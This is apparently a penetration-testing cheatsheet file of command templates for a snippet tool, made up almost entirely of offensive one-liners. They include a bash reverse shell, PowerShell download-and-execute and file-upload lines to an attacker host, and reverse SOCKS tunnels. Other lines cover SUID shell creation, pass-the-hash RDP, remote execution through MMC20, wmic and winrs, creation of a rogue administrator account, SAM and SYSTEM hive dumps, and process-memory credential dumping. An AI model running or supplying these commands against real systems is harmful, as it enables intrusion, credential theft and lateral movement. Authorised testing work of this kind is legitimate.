;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

% pentest

$ lhost: ip -j address | jq -r '.[].addr_info.[]|select(.label)|[.label,.local]|@tsv' --- --delimiter '\t' --column 2 --prevent-extra
$ rhost: getent hosts | awk '{printf "%s\t%s\n",$2,$1}' --- --delimiter '\t' --column 2 --prevent-extra

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# bash reverse shell
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1

# ssh socks
ssh -D <lport> <username>@<rhost>

# ssh reverse socks
ssh -R <lport> <username>@<lhost>

# chisel reverse server
chisel server -p <lport> --reverse

# chisel reverse client
chisel client <lhost>:<lport> R:<lport2>:socks

# nmap quick windows scan
nmap -Pn -p445,3389,5985,5986 <rhost>

# nmap fast
nmap -sSU -p- -Pn --max-retries=0 -T4 -v <rhost>

# nmap ipv6
nmap -6 <rhost>

# dig zone transfer
dig axfr @<rhost> <domain>

# ldapsearch base
ldapsearch -x -H ldap://<rhost> -s base

# ldapsearch auth
ldapsearch -x -H ldap://<rhost> -D <username>@<domain> -w <password> -b 'dc=<dc0>,dc=<dc1>'

# smbclient list
smbclient -U <username> -L <rhost>

# smbclient access
smbclient -U <username> '\\<rhost>\<share>'

# rpcclient
rpcclient -U <username> <rhost>

# snmpwalk
snmpwalk -v 2c -c public <rhost> .1 ET-SNMP-EXTEND-MIB::nsExtendOutputFull

# xfreerdp password auth
xfreerdp /cert-ignore /u:<username> /p:<password> /v:<rhost> /d:<domain>

# xfreerdp ntlm auth
xfreerdp /cert-ignore /u:<username> /pth:<ntlm> /v:<rhost> /d:<domain>

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# bash privileged shell
cp /bin/sh /tmp/sh && chmod +s /tmp/sh

# docker check permission
ip link add dummy0 type dummy && ip link delete dummy0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# IEX IWR
IEX(IWR 'http://<lhost>:<lport>/<path>' -UseBasicParsing)

# IEX WebClient
IEX(New-Object Net.WebClient).DownloadString('http://<lhost>:<lport>/<path>')

# WebClient DownloadFile
(New-Object Net.WebClient).DownloadFile('http://<lhost>:<lport>/<path>', '<file>')

# WebClient UploadFile
(New-Object Net.WebClient).UploadFile('http://<lhost>:<lport>/<path>', '<file>')

# Enter-PSSession
$cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))
Enter-PSSession -ComputerName <computer> -Credential $cred

# Invoke-Command
$cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))
Invoke-Command -ScriptBlock {<command>} -Credential $cred -Computer localhost

# Start-Process
$cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))
Start-Process -FilePath "powershell" -ArgumentList <command> -Credential $cred

# MMC20.Application
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "<rhost>")).Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c <command>", "7")

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# base64
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('<path>'))

# get ACL
Get-ACL <path> | fl *

# copy ACL
Set-Acl -Path <dst> -AclObject $(Get-Acl -Path <src>)

# find file
Get-ChildItem -Path <path> -Include <pattern> -File -Recurse -Force -ErrorAction SilentlyContinue

# mouont HKU
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS

# get services
Set-Location HKLM:\\System\CurrentControlSet\Services
Get-ChildItem

# get services
Get-CimInstance -ClassName win32_service

# get tasks
Get-ScheduledTask

# powershell
powershell -ep bypass

# PSHistory
(Get-PSReadlineOption).HistorySavePath

# get password from xml cred file
$cred = Import-CliXml -Path <path>
$cred.GetNetworkCredential().Password

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# wmic
wmic /node:<rhost> /user:<username> /password:<password> process call create "<command>"

# winrs
winrs -r:<rhost> -u:<username> -p:<password> "<command>"

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# runas
runas /user:<domain>\<username> /savecred <path>

# create new user
net user <username> <password> /add

# add user to Administrator group
net localgroup Administrators <username> /add

# access fs
net use D: \\<rhost>\C$ <password> /user:<username>

# windows recon
systeminfo
whoami /all
net user
net localgroup Administrators
net group /domain
cmdkey /list
schtasks /query /fo LIST /v

# dump HKLM
reg save HKLM\SAM <path0>
reg save HKLM\SYSTEM <path1>

# dump process memory
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <pid> <path> full

# set service
sc config <service> bin_path= "<path>"

# get service info
sc qc <service>

# get working services
tasklist /svc

# powershell script
type <path> | powershell -NoProfile -

# powershell base64
powershell -EncodedCommand <base64>

# kerberos
klist
